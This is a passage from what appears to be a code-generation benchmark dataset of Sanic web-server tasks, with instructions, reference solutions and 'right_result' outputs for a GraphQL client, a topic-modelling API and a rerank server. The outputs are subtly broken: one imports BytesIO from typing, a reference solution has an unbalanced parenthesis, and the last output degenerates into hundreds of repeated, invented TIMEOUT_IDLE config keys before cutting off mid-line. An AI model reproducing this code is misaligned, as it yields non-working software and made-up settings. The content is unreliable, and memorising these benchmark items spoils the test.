    "Instruction": "Task Description: Create a Python class that implements an HTTP client using the Sanic framework, capable of handling GraphQL requests and standard HTTP methods (GET, POST, PATCH, PUT, DELETE). The class should support both query parameters and file uploads, and provide appropriate response handling.\n\nClass Description: The `SanicHttpClient` class is a wrapper around Sanic's ASGI client that simplifies making HTTP requests, particularly for GraphQL endpoints. It handles request construction, header management, and response formatting.\n\nAttributes:\n- app: Sanic - The Sanic application instance used for handling requests\n- graphiql: Optional[bool] - Flag to enable GraphiQL interface\n- graphql_ide: Optional[str] - The GraphQL IDE to use (default: \"graphiql\")\n- allow_queries_via_get: bool - Whether to allow GraphQL queries via GET method\n- result_override: Optional[Any] - Optional result override for testing\n- multipart_uploads_enabled: bool - Flag to enable multipart file uploads\n\nMethods:\n- __init__(graphiql: Optional[bool], graphql_ide: Optional[str], allow_queries_via_get: bool, result_override: Optional[Any], multipart_uploads_enabled: bool) -> None - Initializes the Sanic application and sets up the GraphQL route\n- _graphql_request(method: Literal[\"get\", \"post\"], query: Optional[str], variables: Optional[Dict[str, object]], files: Optional[Dict[str, BytesIO]], headers: Optional[Dict[str, str]], **kwargs: Any) -> Response - Internal method to handle GraphQL requests with proper body construction\n- request(url: str, method: Literal[\"get\", \"post\", \"patch\", \"put\", \"delete\"], headers: Optional[Dict[str, str]]) -> Response - General HTTP request handler\n- get(url: str, headers: Optional[Dict[str, str]]) -> Response - Convenience method for GET requests\n- post(url: str, data: Optional[bytes], json: Optional[Dict], headers: Optional[Dict[str, str]]) -> Response - Convenience method for POST requests with data or JSON payload",
    "Canonical_solution": "from sanic import Sanic\nfrom sanic.request import Request as SanicRequest\nfrom typing import Any, Optional, Literal, Dict\nfrom io import BytesIO\nfrom json import dumps\nfrom random import randint\n\nclass SanicHttpClient:\n    def __init__(\n        self,\n        graphiql: Optional[bool] = None,\n        graphql_ide: Optional[str] = \"graphiql\",\n        allow_queries_via_get: bool = True,\n        result_override: Optional[Any] = None,\n        multipart_uploads_enabled: bool = False,\n    ):\n        self.app = Sanic(f\"test_{int(randint(0, 1000))}\")\n        view = GraphQLView.as_view(\n            schema=schema,\n            graphiql=graphiql,\n            graphql_ide=graphql_ide,\n            allow_queries_via_get=allow_queries_via_get,\n            result_override=result_override,\n            multipart_uploads_enabled=multipart_uploads_enabled,\n        )\n        self.app.add_route(view, \"/graphql\")\n\n    async def _graphql_request(\n        self,\n        method: Literal[\"get\", \"post\"],\n        query: Optional[str] = None,\n        variables: Optional[Dict[str, object]] = None,\n        files: Optional[Dict[str, BytesIO]] = None,\n        headers: Optional[Dict[str, str]] = None,\n        **kwargs: Any,\n    ) -> Response:\n        body = self._build_body(\n            query=query, variables=variables, files=files, method=method\n        )\n\n        if body:\n            if method == \"get\":\n                kwargs[\"params\"] = body\n            elif files:\n                kwargs[\"data\"] = body\n            else:\n                kwargs[\"content\"] = dumps(body)\n\n        request, response = await self.app.asgi_client.request(\n            method,\n            \"/graphql\",\n            headers=self._get_headers(method=method, headers=headers, files=files),\n            files=files,\n            **kwargs,\n        )\n\n        return Response(\n            status_code=response.status_code,\n            data=response.content,\n            headers=response.headers,\n        )\n\n    async def request(\n        self,\n        url: str,\n        method: Literal[\"get\", \"post\", \"patch\", \"put\", \"delete\"],\n        headers: Optional[Dict[str, str]] = None,\n    ) -> Response:\n        request, response = await self.app.asgi_client.request(\n            method,\n            url,\n            headers=headers,\n        )\n\n        return Response(\n            status_code=response.status_code,\n            data=response.content,\n            headers=response.headers,\n        )\n\n    async def get(\n        self,\n        url: str,\n        headers: Optional[Dict[str, str]] = None,\n    ) -> Response:\n        return await self.request(url, \"get\", headers=headers)\n\n    async def post(\n        self,\n        url: str,\n        data: Optional[bytes] = None,\n        json: Optional[Dict] = None,\n        headers: Optional[Dict[str, str]] = None,\n    ) -> Response:\n        body = data or dumps(json)\n        request, response = await self.app.asgi_client.request(\n            \"post\", url, content=body, headers=headers\n        )\n\n        return Response(\n            status_code=response.status_code,\n            data=response.content,\n            headers=response.headers,\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "right_result": "from sanic import Sanic, response\nfrom sanic.request import Request\nfrom typing import Optional, Dict, Any, Union, Literal, BytesIO\nimport json\n\nclass SanicHttpClient:\n    def __init__(self, graphiql: Optional[bool] = None, graphql_ide: Optional[str] = \"graphiql\", allow_queries_via_get: bool = False, result_override: Optional[Any] = None, multipart_uploads_enabled: bool = False):\n        self.app = Sanic(__name__)\n        self.graphiql = graphiql\n        self.graphql_ide = graphql_ide\n        self.allow_queries_via_get = allow_queries_via_get\n        self.result_override = result_override\n        self.multipart_uploads_enabled = multipart_uploads_enabled\n\n        @self.app.route(\"/graphql\", methods=[\"GET\", \"POST\"])\n        async def graphql(request: Request):\n            if request.method == \"GET\" and not self.allow_queries_via_get:\n                return response.json({\"error\": \"GraphQL queries are not allowed via GET method.\"}, status=405)\n            \n            data = request.json or {}\n            query = data.get(\"query\")\n            variables = data.get(\"variables\")\n            files = {}\n            for key, value in request.files.items():\n                if isinstance(value, BytesIO):\n                    files[key] = value\n\n            if query:\n                return await self._graphql_request(\"post\", query, variables, files, request.headers, **data)\n            else:\n                return await self._graphql_request(\"get\", None, None, files, request.headers, **data)\n\n        @self.app.route(\"/<path:path>\", methods=[\"GET\", \"POST\", \"PATCH\", \"PUT\", \"DELETE\"])\n        async def general_request(request: Request):\n            url = request.path\n            method = request.method\n            headers = request.headers\n            if method == \"GET\":\n                return await self.get(url, headers)\n            elif method == \"POST\":\n                data = request.form.get(\"data\") or request.json\n                return await self.post(url, data, request.json, headers)\n            elif method == \"PATCH\":\n                return await self.request(url, \"patch\", headers)\n            elif method == \"PUT\":\n                return await self.request(url, \"put\", headers)\n            elif method == \"DELETE\":\n                return await self.request(url, \"delete\", headers)\n            else:\n                return response.json({\"error\": \"Unsupported HTTP method.\"}, status=405)\n\n    def _graphql_request(self, method: Literal[\"get\", \"post\"], query: Optional[str], variables: Optional[Dict[str, object]], files: Optional[Dict[str, BytesIO]], headers: Optional[Dict[str, str]], **kwargs: Any) -> Response:\n        if method == \"get\" and query:\n            return response.json({\"error\": \"GraphQL queries cannot be made via GET method.\"}, status=405)\n        \n        if query:\n            body = {\"query\": query}\n            if variables:\n                body[\"variables\"] = variables\n            if files:\n                body[\"files\"] = files\n            content_type = \"application/json\"\n        else:\n            body = {}\n            content_type = \"multipart/form-data\" if files else \"application/x-www-form-urlencoded\"\n\n        if content_type == \"multipart/form-data\":\n            return response.raw(\n                request=self.app.test_client().request(\n                    method=method,\n                    url=\"/graphql\",\n                    headers=headers,\n                    files=files,\n                    **kwargs\n                ).raw\n            )\n        else:\n            return response.json(\n                self.app.test_client().request(\n                    method=method,\n                    url=\"/graphql\",\n                    headers=headers,\n                    json=body,\n                    **kwargs\n                ).json\n            )\n\n    def request(self, url: str, method: Literal[\"get\", \"post\", \"patch\", \"put\", \"delete\"], headers: Optional[Dict[str, str]]) -> Response:\n        return self.app.test_client().request(\n            method=method,\n            url=url,\n            headers=headers\n        )\n\n    def get(self, url: str, headers: Optional[Dict[str, str]]) -> Response:\n        return self.request(url, \"get\", headers)\n\n    def post(self, url: str, data: Optional[bytes], json: Optional[Dict], headers: Optional[Dict[str, str]]) -> Response:\n        return self.request(url, \"post\", headers)"
  },
  {
    "Task_id": 214,
    "Instruction": "Task Description: Create a Python class that implements a RESTful API for topic modeling using the Sanic framework, providing endpoints for text tokenization and LDA model inference.\n\nClass Description: The FamiliaAPI class encapsulates a topic modeling service that exposes HTTP endpoints for text processing. It initializes with model configurations, sets up route handlers, and manages inference engines for LDA and SLDA models.\n\nAttributes:\n\napp: [Sanic] - The Sanic application instance for handling HTTP requests\nmodel_name: [str] - Name of the topic model being used\nmodel_path: [str] - Filesystem path to the model directory\nn_workers: [int] - Number of worker processes for parallel processing\nmodel_dir: [str] - Full path to the model directory\nemb_file: [str] - Filename for the word embeddings model\ninference_engine_lda: [InferenceEngineWrapper] - Wrapper for LDA model inference\ninference_engine_slda: [InferenceEngineWrapper] - Wrapper for SLDA model inference\ntwe: [TopicalWordEmbeddingsWrapper] - Wrapper for topical word embeddings\nlda_topic_words: [defaultdict] - Dictionary storing topic words and their scores\n\nMethods:\n\n__init__: [Name](model_path: str, model_name: str, n_workers: int = None) -> None - Initializes the API service with model configurations and sets up routes\n_read_topic_words_from_file: [Name](topic_words_file_name: str = 'topic_words.lda.txt') -> defaultdict - Reads topic words from a file and returns them as a dictionary\n_get_param: [Name](request, param_name, default_value=None, is_list=False) -> Union[str, List[str]] - Extracts parameters from HTTP requests\n_strip_to_none: [Name](text: str) -> Optional[str] - Cleans and validates input text\n_response: [Name](success: bool = True, data=None, message=None) -> HTTPResponse - Constructs standardized JSON responses\n_error_response: [Name](message: str = 'Invalid request') -> HTTPResponse - Creates error responses\n_setup_routes: [Name]() -> None - Defines all API endpoints and their handlers\nrun: [Name]() -> None - Starts the Sanic server with configured workers",
    "Canonical_solution": "from sanic import Sanic\nfrom sanic.response import json\nfrom sanic_openapi import swagger_blueprint, doc\nfrom typing import Optional, List, Dict, Union\nfrom collections import defaultdict\nimport re\n\nRE_BACKSPACES = re.compile(\"\\b+\")\n\nclass FamiliaAPI:\n    def __init__(self, model_path: str, model_name: str, n_workers: int = None):\n        self.app = Sanic(\"Familia\", strict_slashes=True)\n        self.app.blueprint(swagger_blueprint)\n        self.app.config.API_TITLE = 'Familia API'\n        self.app.config.API_DESCRIPTION = 'A Toolkit for Industrial Topic Modeling'\n        self.app.config.API_PRODUCES_CONTENT_TYPES = ['application/json']\n        \n        self.model_name = model_name.lower()\n        self.model_path = model_path\n        self.n_workers = n_workers if n_workers else multiprocessing.cpu_count()\n        self.model_dir = os.path.join(model_path, model_name)\n        \n        self.emb_file = f\"{model_name}_twe_lda.model\"\n        self.inference_engine_lda = InferenceEngineWrapper(self.model_dir, 'lda.conf', self.emb_file)\n        self.inference_engine_slda = InferenceEngineWrapper(self.model_dir, 'slda.conf')\n        self.twe = TopicalWordEmbeddingsWrapper(self.model_dir, self.emb_file)\n        self.lda_topic_words = self._read_topic_words_from_file()\n\n        self._setup_routes()\n\n    def _read_topic_words_from_file(self, topic_words_file_name='topic_words.lda.txt'):\n        topic_words = defaultdict(list)\n        file_path = os.path.join(self.model_dir, topic_words_file_name)\n        if not os.path.exists(file_path):\n            return topic_words\n        with open(file_path, 'r') as f:\n            line = f.readline()\n            while line:\n                pos = line.find('=')\n                line = line[pos + 2:]\n                topic_id, num = line.strip().split('\\t')\n                topic_id, num = int(topic_id), int(num)\n                f.readline()\n                items = list()\n                for i in range(num):\n                    data = f.readline()\n                    word, score = data.strip().split('\\t')\n                    items.append([word, float(score)])\n                topic_words[topic_id] = items\n                line = f.readline()\n        return topic_words\n\n    def _get_param(self, request, param_name, default_value=None, is_list=False):\n        param_value = (request.form.getlist(param_name) if is_list else request.form.getlist(param_name) or \\\n                     request.args.get(param_name) or \\\n                     default_value\n        if param_value is None:\n            return param_value\n        value_type = type(param_value)\n        if is_list:\n            return param_value if value_type == list else [param_value]\n        return param_value[0] if value_type == list else param_value\n\n    def _strip_to_none(self, text: str):\n        if text is None:\n            return None\n        text = text.strip()\n        text = re.sub(RE_BACKSPACES, '', text)\n        if len(text) == 0:\n            return None\n        if text == 'None':\n            return None\n        return text\n\n    def _response(self, success: bool = True, data=None, message=None):\n        data = {'success': success, 'message': message, 'data': data}\n        data = {k: v for k, v in data.items() if v is not None}\n        try:\n            return json(data, ensure_ascii=False)\n        except Exception:\n            data = {'success': success, 'message': traceback.format_exc()}\n            return json(data, ensure_ascii=False)\n\n    def _error_response(self, message='Invalid request'):\n        return self._response(success=False, message=message)\n\n    def _setup_routes(self):\n        @self.app.route('/')\n        @doc.description(\"ping\")\n        async def api_index(request):\n            message = f\"Familia API is running, check out the api doc at http://{request.host}/swagger/\"\n            return self._response(message=message)\n\n        @self.app.route('/tokenize', methods=[\"POST\"])\n        @doc.summary(\"\u5206\u8bcd\")\n        async def api_tokenize(request):\n            try:\n                text = self._get_param(request, 'text')\n                if text is None:\n                    return self._error_response()\n                result = self.inference_engine_lda.tokenize(text)\n                return self._response(data=result)\n            except Exception as err:\n                return self._error_response(str(err))\n\n        @self.app.route('/lda', methods=[\"POST\"])\n        @doc.summary(\"LDA\u6a21\u578b\u63a8\u65ad\")\n        async def api_lda(request):\n            try:\n                text = self._get_param(request, 'text')\n                n = int(self._get_param(request, 'n', 10))\n                if text is None:\n                    return self._error_response()\n                words = self.inference_engine_lda.tokenize(text)\n                result = self.inference_engine_lda.lda_infer(words)\n                result = result[:n]\n                result = [\n                    {\n                        'topic_id': topic_id,\n                        'score': score,\n                        'topic_words': self.twe.nearest_words_around_topic(topic_id),\n                        'topic_words_poly': self.lda_topic_words.get(topic_id),\n                    } for topic_id, score in result\n                ]\n                return self._response(data=result)\n            except Exception as err:\n                return self._error_response(str(err))\n\n    def run(self):\n        self.app.run(host='0.0.0.0', port=5000, workers=self.n_workers)",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "right_result": "from sanic import Sanic\nfrom sanic.response import json\nfrom sanic.views import View\nimport os\nimport json\nfrom collections import defaultdict\nfrom typing import Union, List, Optional\nimport numpy as np\nimport joblib\nimport re\n\nclass InferenceEngineWrapper:\n    def __init__(self, model_path: str):\n        self.model_path = model_path\n        self.model = joblib.load(model_path)\n\n    def infer(self, text: str) -> dict:\n        # Placeholder for actual inference logic\n        return {\"topic\": \"example_topic\", \"score\": 0.95}\n\nclass TopicalWordEmbeddingsWrapper:\n    def __init__(self, emb_file: str):\n        self.emb_file = emb_file\n        self.embeddings = self._load_embeddings()\n\n    def _load_embeddings(self):\n        embeddings = {}\n        with open(self.emb_file, 'r', encoding='utf-8') as f:\n            for line in f:\n                parts = line.strip().split()\n                if len(parts) < 2:\n                    continue\n                word = parts[0]\n                vector = list(map(float, parts[1:]))\n                embeddings[word] = vector\n        return embeddings\n\n    def get_word_embedding(self, word: str) -> Optional[list]:\n        return self.embeddings.get(word, None)\n\nclass FamiliaAPI(Sanic):\n    def __init__(self, model_path: str, model_name: str, n_workers: int = None):\n        super().__init__(workers=n_workers)\n        self.app = self\n        self.model_name = model_name\n        self.model_path = model_path\n        self.n_workers = n_workers\n        self.model_dir = os.path.join(model_path, model_name)\n        self.emb_file = os.path.join(self.model_dir, 'word_embeddings.txt')\n        self.inference_engine_lda = InferenceEngineWrapper(os.path.join(self.model_dir, 'lda_model.joblib'))\n        self.inference_engine_slda = InferenceEngineWrapper(os.path.join(self.model_dir, 'slda_model.joblib'))\n        self.twe = TopicalWordEmbeddingsWrapper(self.emb_file)\n        self.lda_topic_words = self._read_topic_words_from_file()\n\n    def _read_topic_words_from_file(self, topic_words_file_name: str = 'topic_words.lda.txt') -> defaultdict:\n        topic_words = defaultdict(list)\n        file_path = os.path.join(self.model_dir, topic_words_file_name)\n        if not os.path.exists(file_path):\n            return topic_words\n        with open(file_path, 'r', encoding='utf-8') as f:\n            for line in f:\n                parts = line.strip().split('\\t')\n                if len(parts) < 2:\n                    continue\n                topic, words = parts[0], parts[1:]\n                for word in words:\n                    topic_words[topic].append(word)\n        return topic_words\n\n    def _get_param(self, request, param_name, default_value=None, is_list=False):\n        value = request.args.get(param_name)\n        if value is None:\n            return default_value\n        if is_list:\n            return value.split(',') if ',' in value else [value]\n        return value\n\n    def _strip_to_none(self, text: str) -> Optional[str]:\n        if not text or not text.strip():\n            return None\n        return text.strip()\n\n    def _response(self, success: bool = True, data=None, message=None) -> dict:\n        if not success:\n            return {\"success\": False, \"message\": message}\n        return {\"success\": True, \"data\": data}\n\n    def _error_response(self, message: str = 'Invalid request') -> dict:\n        return {\"success\": False, \"message\": message}\n\n    def _setup_routes(self):\n        @self.route('/tokenize', methods=['POST'])\n        async def tokenize(request):\n            text = request.json.get('text')\n            if not text:\n                return json(self._error_response(\"Text parameter is required\"))\n            cleaned_text = self._strip_to_none(text)\n            if not cleaned_text:\n                return json(self._error_response(\"Text cannot be empty\"))\n            tokens = re.findall(r'\\b\\w+\\b', cleaned_text)\n            return json({\"tokens\": tokens})\n\n        @self.route('/lda/infer', methods=['POST'])\n        async def lda_infer(request):\n            text = request.json.get('text')\n            if not text:\n                return json(self._error_response(\"Text parameter is required\"))\n            cleaned_text = self._strip_to_none(text)\n            if not cleaned_text:\n                return json(self._error_response(\"Text cannot be empty\"))\n            result = self.inference_engine_lda.infer(cleaned_text)\n            return json({\"topic\": result[\"topic\"], \"score\": result[\"score\"]})\n\n        @self.route('/slda/infer', methods=['POST'])\n        async def slda_infer(request):\n            text = request.json.get('text')\n            if not text:\n                return json(self._error_response(\"Text parameter is required\"))\n            cleaned_text = self._strip_to_none(text)\n            if not cleaned_text:\n                return json(self._error_response(\"Text cannot be empty\"))\n            result = self.inference_engine_slda.infer(cleaned_text)\n            return json({\"topic\": result[\"topic\"], \"score\": result[\"score\"]})\n\n        @self.route('/twe/embedding', methods=['GET'])\n        async def get_embedding(request):\n            word = request.args.get('word')\n            if not word:\n                return json(self._error_response(\"Word parameter is required\"))\n            embedding = self.twe.get_word_embedding(word)\n            return json({\"embedding\": embedding})\n\n        @self.route('/lda/topic_words', methods=['GET'])\n        async def get_topic_words(request):\n            return json({\"topic_words\": dict(self.lda_topic_words)})\n\n    def run(self):\n        self._setup_routes()\n        self.run_dev(host='0.0.0.0', port=8000)"
  },
  {
    "Task_id": 216,
    "Instruction": "Task Description: Create a Sanic-based HTTP server that handles reranking requests by processing a query and a list of passages through an ONNX backend, and returns the reranked results in JSON format.\n\nFunction Description: The server consists of two main functions: a route handler for processing rerank requests and a listener for initializing the ONNX backend before server startup. The route handler accepts POST requests with JSON data containing a query and passages, processes them using the ONNX backend, and returns the reranked results. The listener sets up the ONNX backend with GPU or CPU configuration based on command-line arguments.\n\nInput:\n- For the rerank route handler:\n  - request: Sanic request object containing JSON data with:\n    - query: str - The search query to rerank against\n    - passages: List[str] - The list of passages to be reranked\n- For the setup_onnx_backend listener:\n  - app: Sanic application instance\n  - loop: Event loop (unused in this case)\n- Command-line arguments:\n  --use_gpu: bool - Flag to enable GPU acceleration\n  --workers: int - Number of worker processes\n\nOutput:\n- For the rerank route handler:\n  - Returns: JSON response containing the reranked results\n- For the server startup:\n  - Starts an HTTP server listening on port 8001 with specified number of workers",
    "Canonical_solution": "from sanic import Sanic\nfrom sanic.response import json\nimport argparse\n\napp = Sanic(\"rerank_server\")\n\n@app.route(\"/rerank\", methods=[\"POST\"])\nasync def rerank(request):\n    data = request.json\n    query = data.get('query')\n    passages = data.get('passages')\n\n    onnx_backend: RerankOnnxBackend = request.app.ctx.onnx_backend\n    result_data = onnx_backend.get_rerank(query, passages)\n\n    return json(result_data)\n\n@app.listener('before_server_start')\nasync def setup_onnx_backend(app, loop):\n    app.ctx.onnx_backend = RerankOnnxBackend(use_cpu=not args.use_gpu)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--use_gpu', action=\"store_true\", help='use gpu or not')\n    parser.add_argument('--workers', type=int, default=1, help='workers')\n    args = parser.parse_args()\n    \n    app.run(host=\"0.0.0.0\", port=8001, workers=args.workers)",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "right_result": "import sanic\nfrom sanic import response, Blueprint\nimport onnxruntime as ort\nimport argparse\nimport os\n\napp = sanic.Sanic(__name__)\nbp = Blueprint('rerank', __name__)\n\ndef setup_onnx_backend(app, loop):\n    use_gpu = False\n    try:\n        use_gpu = os.environ.get('USE_GPU', 'False').lower() == 'true'\n    except:\n        pass\n    providers = []\n    if use_gpu:\n        providers = ['CUDAExecutionProvider']\n    else:\n        providers = ['CPUExecutionProvider']\n    session = ort.InferenceSession(\"model.onnx\", providers=providers)\n    app.ctx.onnx_session = session\n\n@bp.route('/rerank', methods=['POST'])\nasync def rerank(request):\n    data = request.json\n    query = data.get('query')\n    passages = data.get('passages')\n    if not query or not passages:\n        return response.json({'error': 'Missing query or passages'}, status=400)\n    session = app.ctx.onnx_session\n    inputs = {session.get_inputs()[0].name: session.get_inputs()[0].type.GetTensorType().GetShape()}\n    for i, passage in enumerate(passages):\n        inputs[f'passage_{i}'] = [passage]\n    outputs = session.run(None, inputs)\n    reranked = outputs[0]\n    return response.json({'reranked': reranked})\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--use_gpu', action='store_true')\n    parser.add_argument('--workers', type=int, default=1)\n    args = parser.parse_args()\n    os.environ['USE_GPU'] = str(args.use_gpu).lower()\n    app.config['ENABLE_CPUS'] = args.workers\n    app.blueprint(bp)\n    app.config['LOOP'] = None\n    app.config['HOST'] = '0.0.0.0'\n    app.config['PORT'] = 8001\n    app.config['PROCESSES'] = args.workers\n    app.config['BACKLOG'] = 2048\n    app.config['MAX_REQUESTS'] = 10000\n    app.config['MAX_THREADS'] = 100\n    app.config['KEEP_ALIVE'] = 5\n    app.config['TIMEOUT_KEEP_ALIVE'] = 5\n    app.config['TIMEOUT_CONNECTION'] = 30\n    app.config['TIMEOUT_READ'] = 30\n    app.config['TIMEOUT_WRITE'] = 30\n    app.config['TIMEOUT_TASK'] = 30\n    app.config['TIMEOUT_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE'] = 30\n    app.config['TIMEOUT_IDLE_CONNECTION'] = 30\n    app.config['TIMEOUT_IDLE_TASK'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_CLIENT'] = 30\n    app.config['TIMEOUT_IDLE_SERVER'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] = 30\n    app.config['TIMEOUT_IDLE_PIPE'] = 30\n    app.config['TIMEOUT_IDLE_STREAM'] = 30\n    app.config['TIMEOUT_IDLE_BUFFER'] = 30\n    app.config['TIMEOUT_IDLE_CHANNEL'] = 30\n    app.config['TIMEOUT_IDLE_QUEUE'] = 30\n    app.config['TIMEOUT_IDLE_EVENT'] = 30\n    app.config['TIMEOUT_IDLE_MUTEX'] = 30\n    app.config['TIMEOUT_IDLE_CONDVAR'] = 30\n    app.config['TIMEOUT_IDLE_THREAD'] = 30\n    app.config['TIMEOUT_IDLE_PROCESS'] = 30\n    app.config['TIMEOUT_IDLE_FILE'] = 30\n    app.config['TIMEOUT_IDLE_SOCKET'] 